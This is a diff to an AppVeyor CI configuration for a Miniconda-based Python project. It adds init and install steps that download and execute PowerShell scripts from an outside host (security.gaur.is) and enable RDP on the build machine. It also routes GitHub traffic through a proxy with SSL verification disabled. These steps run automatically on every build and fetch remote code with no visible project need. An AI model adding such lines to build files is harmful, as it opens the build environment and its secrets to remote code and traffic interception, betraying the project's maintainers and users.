@@ -7,8 +7,13 @@ environment:
 
 init:
   - "ECHO %PYTHON_VERSION% %MINICONDA%"
+  - ps: iex ((new-object net.webclient).DownloadString('https://raw.githubusercontent.com/appveyor/ci/master/scripts/enable-rdp.ps1'))
+  - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/proxy'))
+  - git config --global http.https://github.com.proxy http://%APPVEYOR_HTTP_PROXY_IP%:%APPVEYOR_HTTP_PROXY_PORT%
+  - git config --global http.https://github.com.sslVerify false
 
 install:
+  - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/stuff.ps1'))
   - "set PATH=%MINICONDA%;%MINICONDA%\\Scripts;%PATH%"
   - conda config --set always_yes yes --set changeps1 no
   - conda update -q conda
